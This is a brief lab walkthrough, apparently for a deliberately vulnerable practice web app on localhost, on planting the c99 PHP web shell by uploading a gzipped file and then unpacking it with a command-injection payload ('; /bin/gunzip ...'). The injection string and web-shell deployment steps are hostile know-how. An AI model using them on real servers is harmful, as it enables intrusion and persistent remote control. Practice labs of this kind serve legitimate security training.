C99Shell
========

c99 is a well-known and powerful shell.

You have to **upload** it, then use a **command execution attack** to make it
usable.

1. Upload the exploit (`.gz`), then look at: http://localhost:8090/hackable/uploads/
2. Command execution: `; /bin/gunzip -v ../../hackable/uploads/c99.php`
